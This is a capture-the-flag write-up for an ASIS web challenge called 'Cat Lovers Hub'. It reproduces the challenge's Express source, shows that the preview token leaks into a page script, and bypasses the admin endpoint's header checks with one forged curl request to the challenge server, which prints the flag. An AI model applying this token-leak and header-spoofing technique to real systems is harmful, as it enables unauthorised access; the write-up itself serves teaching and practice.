# Cat Lovers Hub

```
Welcome to the Cat Lovers Hub! 🐾

Sometimes, what you see is only a fraction of the story. Your cat may hide secrets in unexpected places…

http://65.109.176.78:3000/
```

Attachment:

```javascript
// app.js

const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

const STORE = {};  
const PREVIEWS = new Map();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

const FLAG = "ASIS{FAKE_FLAG}";

app.use((req, res, next) => {
    if (req.query.sid) {
        req.sid = req.query.sid;
    } else if (req.headers['x-sid']) {
        req.sid = req.headers['x-sid'];
    } else {
        req.sid = crypto.randomUUID();
    }

    if (!STORE[req.sid]) {
        STORE[req.sid] = { bio: '', flag: FLAG };
    }

    res.setHeader('X-SID', req.sid);
    next();
});

app.use('/public', express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.send(renderTemplate('index.html', {}));
});

app.get('/submit', (req, res) => {
    res.send(renderTemplate('submit.html', {}));
});

app.post('/submit', (req, res) => {
    const bio = (req.body.bio || '').slice(0, 2048);
    STORE[req.sid].bio = bio;

    const adminHtml = renderTemplate('admin_preview.html', {
        bioRaw: bio,
        flag: STORE[req.sid].flag
    });

    const token = crypto.randomBytes(16).toString('hex');

    PREVIEWS.set(token, { html: adminHtml, sid: req.sid, used: false });

    console.log(`Admin preview token for sid ${req.sid}: ${token}`);

    res.redirect(`/player_preview?sid=${req.sid}`);

});

app.get('/player_preview', (req, res) => {
    const bioEscaped = escapeHtml(STORE[req.sid].bio);

    const adminHtml = renderTemplate('admin_preview.html', {
        bioRaw: STORE[req.sid].bio,
        flag: STORE[req.sid].flag
    });
    const token = crypto.randomBytes(16).toString('hex');
    PREVIEWS.set(token, { html: adminHtml, sid: req.sid, used: false });

    res.send(renderTemplate('player_preview.html', {
        bioEscaped,
        token 
    }));
});

app.get('/admin/preview_blob', (req, res) => {
    const token = req.query.token;

    if (!token) return res.status(403).send('Forbidden');

    if (req.get('X-CTF') !== 'player') {
        return res.status(403).send('Forbidden');
    }

    if (req.get('Sec-Fetch-Dest') !== 'iframe') {
        return res.status(403).send('iframe');
    }

    const meta = PREVIEWS.get(token);
    if (!meta) return res.status(403).send('Invalid or expired token');
    if (meta.used) return res.status(403).send('Token already used');

    meta.used = true;
    PREVIEWS.delete(token);

    res.setHeader(
        'Content-Security-Policy',
        "default-src 'none'; script-src 'none'; object-src 'none'; image-src 'none'; sandbox allow-scripts allow-same-origin"
    );

    res.type('html').send(meta.html);
});

function renderTemplate(name, ctx) {
    const file = fs.readFileSync(path.join(__dirname, 'templates', name), 'utf8');
    return file.replace(/\{\{\s*(\w+)\s*\}\}/g, (_, k) => (ctx[k] !== undefined ? ctx[k] : ''));
}

function escapeHtml(s) {
    return String(s || '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// -------------------------
app.listen(PORT, () => {
    console.log(`CTF running on http://0.0.0.0:${PORT}`);
});
```

We can access the flag from `/admin/preview_blob`, but required:

1. a valid token: it is exposed in `/player_review` in a `<script></script>` block in the template:

```js
<script>
  const token = "{{ token }}";
</script>
```

2. correct headers: `X-CTF: player`, `Sec-Fetch-Dest: iframe`

Access using the given token:

```shell
$ curl -vv http://65.109.176.78:3000/admin/preview_blob?token=d621c98deb90a21c27ea57888679f718 -H "X-CTF: player" -H "Sec-Fetch-Dest: iframe"
<div id="real-flag">ASIS{CSP_HERO_ARE'NT_YOU_2a7590cb-9559-48c8-bdb9-ca41c0d184ed}</div>
```

Flag: `ASIS{CSP_HERO_ARE'NT_YOU_2a7590cb-9559-48c8-bdb9-ca41c0d184ed}`.
